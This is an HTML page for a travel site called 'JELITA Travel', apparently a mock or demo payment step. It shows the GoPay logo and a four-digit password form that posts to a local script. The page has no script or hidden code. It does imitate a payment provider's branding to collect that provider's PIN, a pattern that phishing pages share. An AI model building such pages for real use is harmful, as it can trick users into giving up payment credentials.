<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify GoPay Password</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #c2cbdb;
        }
        .header {
            background-color: #4b6aa1;
            color: white;
            padding: 10px;
            text-align: center;
        }
        .container {
            text-align: center;
            padding: 40px 20px;
        }
        .gopay-logo {
            width: 100px;
            margin: 20px 0;
        }
        .password-box {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 30px 0 10px 0;
        }
        .password-box input {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            border-radius: 8px;
            border: 2px solid #ccc;
            background-color: white;
        }
        .info-text {
            font-weight: bold;
            margin-bottom: 30px;
        }
        .continue-button {
            padding: 12px 30px;
            font-size: 16px;
            background-color: #e47070;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="header">
        <h2>JELITA Travel</h2>
    </div>

    <div class="container">
        <img class="gopay-logo" src="https://gopay.co.id/static/logo.svg" alt="GoPay Logo">

        <form action="paymentsuccess.php" method="post">
            <div class="password-box">
                <input type="password" name="digit1" maxlength="1" required>
                <input type="password" name="digit2" maxlength="1" required>
                <input type="password" name="digit3" maxlength="1" required>
                <input type="password" name="digit4" maxlength="1" required>
            </div>
            <div class="info-text">Enter 4 Digit Password</div>
            <button type="submit" class="continue-button">Continue</button>
        </form>
    </div>

</body>
</html>
